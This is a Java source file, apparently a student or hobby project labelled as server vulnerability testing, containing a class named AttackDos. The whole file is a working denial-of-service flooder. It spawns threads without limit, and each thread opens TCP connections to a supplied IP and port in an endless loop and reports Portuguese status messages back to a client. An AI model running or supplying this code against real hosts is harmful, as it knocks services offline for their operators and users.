/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package testevunerabilidadeserver;

import java.io.IOException;
import java.io.PrintStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author patri
 */
public class AttackDos extends Thread {
    
    private static String  ip_target_received;
    private static String port_target_received;
    private static PrintStream sendLogToClient;
    public AttackDos(){
    }
    
    
    public void dosAttack(String ip_target, String port_target, PrintStream sendToClient){
    
        ip_target_received = ip_target;
        port_target_received = port_target;
        sendLogToClient = sendToClient;
       while(true){
       
           Thread threadAttack = new AttackDos();
           threadAttack.start();
       
           try{
           TimeUnit.SECONDS.sleep(1/7000);
           } catch (InterruptedException ex) {
               sendLogToClient.println("Multiplas Threads sendo criadas!!!");
           }
       }
    
   
    
    }
    @Override
    public void run(){
   
        while(true){
            try {
                try {
                    TimeUnit.SECONDS.sleep(1/7000);
                } catch (InterruptedException ex) {
                   sendLogToClient.println("======================Conexão estabelecida=========================");
                }
                Socket targetSocket = new Socket(ip_target_received, Integer.parseInt(port_target_received));
                
                sendLogToClient.println("======================Conexão estabelecida=========================");
            } catch (IOException ex) {
              
               sendLogToClient.println("==========================Conexão Falhou=========================");
            }
        
        }
    
    }        
   
    
    
}
